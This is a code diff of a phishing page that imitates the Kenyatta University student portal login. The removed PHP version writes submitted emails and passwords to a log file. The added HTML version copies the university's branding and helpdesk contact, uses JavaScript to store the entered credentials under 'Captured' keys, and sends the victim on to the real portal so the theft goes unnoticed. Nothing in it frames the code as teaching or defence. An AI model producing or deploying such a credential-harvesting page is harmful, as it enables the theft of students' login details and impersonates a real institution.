@@ -1,18 +1,43 @@
-<?php
-// Open a file to store credentials
-$file = fopen("logs.txt", "a");
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kenyatta University Student Portal</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://networks.au-ibar.org/show/kenyatta-university-kenyatta-university-main-campus-kenya-drive-nairobi-kenya/image/2008090514-1076-3134-640x480/AU+REC+logos+-+2022-03-30T161731.591.png" alt="Kenyatta University Logo" class="logo">
+        <h2>Student Portal Login</h2>
 
-// Get the submitted email and password
-$email = $_POST['email'];
-$password = $_POST['password'];
+        <form id="loginForm">
+            <label for="email">University Email</label>
+            <input type="email" id="email" name="email" required>
+            
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+            
+            <button type="submit">Login</button>
+        </form>
 
-// Save to the file
-fwrite($file, "Email: " . $email . " | Password: " . $password . "\n");
+        <p class="notice">If you experience login issues, contact <a href="mailto:ithelpdesk@ku.ac.ke">IT Helpdesk</a>.</p>
+    </div>
 
-// Close the file
-fclose($file);
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form from actually submitting
 
-// Redirect to the real Kenyatta University portal
-header("Location: https://portal.ku.ac.ke");
-exit();
-?>
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            // Store credentials in localStorage
+            localStorage.setItem("CapturedEmail", email);
+            localStorage.setItem("CapturedPassword", password);
+
+            // Redirect to the real KU portal
+            window.location.href = "https://portal.ku.ac.ke";
+        });
+    </script>
+</body>
+</html>
